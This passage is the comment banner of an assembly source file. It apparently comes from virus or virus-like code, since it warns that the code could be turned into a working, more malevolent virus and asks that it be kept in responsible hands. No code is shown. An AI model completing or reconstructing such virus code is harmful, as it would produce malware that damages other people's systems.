; Turn it Into a Working Virus and Anybody With a bit of Assembly Coding     ;
; Experience can Turn it Into a far More Malevolent Program Than it Already  ;
; Is. Keep This Code in Responsible Hands!                                   ;
;                                                                            ;
;****************************************************************************;
